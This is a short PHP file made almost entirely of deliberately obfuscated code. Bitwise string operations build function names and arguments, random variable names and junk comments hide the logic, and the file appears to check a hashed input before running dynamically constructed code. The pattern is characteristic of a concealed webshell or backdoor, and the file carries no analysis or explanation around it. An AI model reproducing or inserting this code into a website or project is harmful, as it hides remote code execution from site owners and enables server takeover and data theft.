<?php
$xxSUoXx='kJR'|~ETIhb;$UFa=A4z^'$PJ';$lP9x='V^RZ,V'^'9;&?C ';$lH93=' '|i;'tIfo2A73wUj3f'.
         '=4JC[Y_';$tLVBY4HA4LN='-&lj>e1"&'.zq1hm.'}'^'er8:a=nhg>(x"+2';$inQkZem=q^#p79'.
         '9';$U5DLU='g%'^'3q';$k2=iv^'9)';$wxL_gX5CdPq='/'^n;$pnrnomIF='/'.PUvE.'"'./*A'.
         '6|>R*/ZPyc^Ld0FpCkcHZ;$YwUhSN9oOXK=O^',';$e6NEKCiQ='+'^N;$SjMRWbG="Q*&"^#FT3N'.
         ')CR';$Gf=A|a;$VndcUIU='='^G;$CBReelg='2H/'.NhCQ22F.'&A'^"F:H)70,C^+Q&";$Yj=/*'.
         '6&8M9;*/"@".NNsH."!"^"b`".bUgl;$VcjZ19SRDEI='@!BD '|'P!HE ';$odf0MURM='We{qle'.
         ':Wq<,No`l'^'~>1% 6'.Tv4y.'~'.h6Q1;$QRWM=Kyo7.':>3Gp;9^4^;'&'~+?58w1_>/5'./*QN'.
         'N<G:*/sp_3;$S62jSHpuo6H='0'|'0';$M45qA='yVT~'._rGnnqOHEDG&'J|tQ~'.YGVE.'^'./*'.
         'XVFNlJMw*/oZfOw;$TF2HtACn='7d'&'{|';$k5Wtqxa0B55='5'&'>';$EnMhKk=$UFa|(#EuF1J'.
         '-5u'&'}n5');$T5=$lP9x&("@1*2VD"^'7T_O(2');$l6eUCfnRuoA=$CBReelg&(#VRCvJgWEw0y'.
         '~w}w_~o~~scm'&'{w}w_~g~~{ko');$lGAWAqVxMnZ=$Yj^('5+(+`E'^bnwb.'=|');'OJXCraMJ'.
         'vs([U@4CrC';$I6Hr6c=('Q"z]4'^'3cT~Q')|$VcjZ19SRDEI;$b56PO1=$odf0MURM^$QRWM;/*'.
         'M0lke*/$tgGdD6G=$lH93|$S62jSHpuo6H;$xy=$M45qA|$tLVBY4HA4LN;$EnMhKk($T5(/*ogZJ'.
         '&a92*/$inQkZem.$U5DLU.$k2.$wxL_gX5CdPq))==('!`0%D@53a81&  e80'|'4D15`"%!A! 39'.
         '0`9!').$TF2HtACn.$pnrnomIF.$YwUhSN9oOXK.$k5Wtqxa0B55.(o^']') or $l6eUCfnRuoA((KS^d2).(#yv'.
         '/g'&'/e'),$e6NEKCiQ.$SjMRWbG,$Gf);$lGAWAqVxMnZ($I6Hr6c($tgGdD6G,$VndcUIU),/*c'.
         ' |)*w~uM */$b56PO1(null,$T5($xy)));#U5q_4,i+i2y0N${lCniBc8@l8ZBD|-he.do5^huX'.
         '7.(ROA5~0yG5K}J1q:pTT_<_cj^)9h!Z.>_&,x=<MHz6SY';